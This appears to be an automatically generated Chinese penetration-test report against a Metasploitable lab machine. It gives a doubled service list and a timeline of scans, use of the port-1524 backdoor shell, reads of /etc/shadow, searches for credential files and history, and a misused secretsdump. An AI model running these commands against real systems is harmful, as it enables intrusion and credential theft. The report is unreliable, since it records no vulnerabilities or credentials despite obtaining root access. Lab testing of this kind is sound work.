# 渗透测试报告

**创建时间**: 2026-04-28 17:09:14.221563
**完成时间**: 2026-04-28 17:50:19.610455
**目标**: 192.168.136.137
**最终阶段**: web

---

## 资产发现 (58 项)

- **?:21** — ftp         vsftpd 2.3.4
- **?:22** — ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
- **?:23** — telnet      Linux telnetd
- **?:25** — smtp        Postfix smtpd
- **?:80** — http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
- **?:111** — rpcbind     2 (RPC #100000)
- **?:139** — netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- **?:445** — netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- **?:512** — exec        netkit-rsh rexecd
- **?:513** — login       OpenBSD or Solaris rlogind
- **?:514** — tcpwrapped
- **?:1099** — java-rmi    GNU Classpath grmiregistry
- **?:1524** — bindshell   Metasploitable root shell
- **?:2049** — nfs         2-4 (RPC #100003)
- **?:2121** — ftp         ProFTPD 1.3.1
- **?:3306** — mysql       MySQL 5.0.51a-3ubuntu5
- **?:3632** — distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
- **?:5432** — postgresql  PostgreSQL DB 8.3.0 - 8.3.7
- **?:5900** — vnc         VNC (protocol 3.3)
- **?:6000** — X11         (access denied)
- **?:6667** — irc         UnrealIRCd
- **?:6697** — irc         UnrealIRCd
- **?:8009** — ajp13       Apache Jserv (Protocol v1.3)
- **?:8180** — http        Apache Tomcat/Coyote JSP engine 1.1
- **?:8787** — drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
- **?:40369** — java-rmi    GNU Classpath grmiregistry
- **?:51467** — mountd      1-3 (RPC #100005)
- **?:54467** — nlockmgr    1-4 (RPC #100021)
- **?:59983** — status      1 (RPC #100024)
- **?:21** — ftp         vsftpd 2.3.4
- **?:22** — ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
- **?:23** — telnet      Linux telnetd
- **?:25** — smtp        Postfix smtpd
- **?:80** — http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
- **?:111** — rpcbind     2 (RPC #100000)
- **?:139** — netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- **?:445** — netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- **?:512** — exec        netkit-rsh rexecd
- **?:513** — login       OpenBSD or Solaris rlogind
- **?:514** — tcpwrapped
- **?:1099** — java-rmi    GNU Classpath grmiregistry
- **?:1524** — bindshell   Metasploitable root shell
- **?:2049** — nfs         2-4 (RPC #100003)
- **?:2121** — ftp         ProFTPD 1.3.1
- **?:3306** — mysql       MySQL 5.0.51a-3ubuntu5
- **?:3632** — distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
- **?:5432** — postgresql  PostgreSQL DB 8.3.0 - 8.3.7
- **?:5900** — vnc         VNC (protocol 3.3)
- **?:6000** — X11         (access denied)
- **?:6667** — irc         UnrealIRCd
- **?:6697** — irc         UnrealIRCd
- **?:8009** — ajp13       Apache Jserv (Protocol v1.3)
- **?:8180** — http        Apache Tomcat/Coyote JSP engine 1.1
- **?:8787** — drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
- **?:40369** — java-rmi    GNU Classpath grmiregistry
- **?:51467** — mountd      1-3 (RPC #100005)
- **?:54467** — nlockmgr    1-4 (RPC #100021)
- **?:59983** — status      1 (RPC #100024)

## 漏洞 (0 项)


## 凭据 (0 项)


## 攻击时间线 (30 步)

- [2026-04-28 17:20:38.692284] **nmap** -sS -sV -O -p- -T4 192.168.136.137
- [2026-04-28 17:23:13.364365] **nmap** -sS -sV -O -p- -T4 192.168.136.137
- [2026-04-28 17:23:18.680829] **nuclei** -u http://192.168.136.137:8180 -t /root/nuclei-templates/
- [2026-04-28 17:23:22.140107] **nuclei** -u http://192.168.136.137:8180 -t /root/nuclei-templates/
- [2026-04-28 17:23:30.368265] **whatweb** http://192.168.136.137:8180
- [2026-04-28 17:23:34.419428] **nuclei** -u http://192.168.136.137:8180 -t /root/nuclei-templates/ -severity critical,high,medium
- [2026-04-28 17:23:39.640524] **nuclei** -u http://192.168.136.137:8180 -t /root/nuclei-templates/ -severity critical,high
- [2026-04-28 17:23:47.541823] **ffuf** -u http://192.168.136.137:8180/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
- [2026-04-28 17:24:20.075269] **ffuf** -u http://192.168.136.137:8180/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404 -e .php,.jsp,.html,.txt,.bak
- [2026-04-28 17:24:43.775569] **ffuf** -u http://192.168.136.137:8180/FUZZ -w /usr/share/wordlists/dirb/big.txt -fc 404
- [2026-04-28 17:29:47.865808] **ffuf** -u http://192.168.136.137:8180/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404 -recursion -recursion-depth 2
- [2026-04-28 17:46:41.301767] **shell** nc 192.168.136.137 1524
- [2026-04-28 17:47:12.751372] **shell** id && whoami && pwd && cat /etc/passwd && ifconfig
- [2026-04-28 17:47:21.185639] **shell** cat /etc/shadow && netstat -tulpn && ps aux | head -20
- [2026-04-28 17:47:30.207129] **impacket-secretsdump** LOCAL -hashes : -sam /etc/shadow -system /etc/passwd 192.168.136.137
- [2026-04-28 17:47:41.992267] **shell** find / -type f -name "*.txt" -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*pass*" -o -name "*cred*" -o -name "*secret*" 2>/dev/null | head -30
- [2026-04-28 17:47:51.509875] **shell** cat /root/.bash_history 2>/dev/null || echo "No root bash history found"
- [2026-04-28 17:48:04.197613] **shell** id && whoami && pwd && ls -la /etc/shadow && cat /etc/passwd | head -20 && uname -a
- [2026-04-28 17:48:13.517301] **shell** netstat -rn && ip route show && arp -a
- [2026-04-28 17:48:22.517260] **shell** sudo -l && id && whoami
- [2026-04-28 17:48:27.924253] **shell** ip addr show && ip route show && arp -n
- [2026-04-28 17:48:36.126484] **shell** cat /etc/shadow
- [2026-04-28 17:48:47.524644] **shell** id && whoami && sudo -l && cat /etc/passwd | grep -E "(root|admin|user)"
- [2026-04-28 17:49:00.733572] **shell** find /home -type f -name ".*history" -o -name ".*bashrc" -o -name ".*profile" 2>/dev/null | xargs ls -la 2>/dev/null
- [2026-04-28 17:49:13.275827] **shell** id && whoami && sudo -l 2>/dev/null && echo "---" && cat /etc/passwd | grep -E "(root|admin|user|daemon)" && echo "---" && ls -la /root/ 2>/dev/null || echo "Cannot access /root"
- [2026-04-28 17:49:26.805959] **shell** uname -a && cat /etc/os-release 2>/dev/null || cat /etc/issue && echo "--- Current user info ---" && id && echo "--- Sudo privileges ---" && sudo -l 2>/dev/null || echo "No sudo access"
- [2026-04-28 17:49:35.392463] **impacket-secretsdump** LOCAL
- [2026-04-28 17:49:42.604939] **shell** ip a show && ip route show && arp -n
- [2026-04-28 17:49:49.685928] **shell** arp -n && netstat -rn && ip route show
- [2026-04-28 17:50:19.610438] **shell** find / -name "tomcat*" -o -name "*catalina*" -o -name "*webapps*" 2>/dev/null | head -20
